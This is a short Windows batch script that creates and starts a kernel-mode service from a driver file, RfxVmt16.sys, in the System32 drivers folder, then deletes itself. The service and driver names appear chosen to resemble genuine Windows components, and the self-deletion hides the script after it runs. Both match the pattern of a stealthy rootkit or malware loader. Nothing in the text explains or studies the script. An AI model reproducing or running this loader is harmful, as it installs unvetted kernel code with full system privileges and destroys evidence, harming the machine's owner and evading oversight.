@echo off
cd %~dp0
sc create ServiceDVRUserBcast_32f1 binpath=C:\Windows\System32\drivers\RfxVmt16.sys type=kernel
sc start ServiceDVRUserBcast_32f1
del "%~f0"



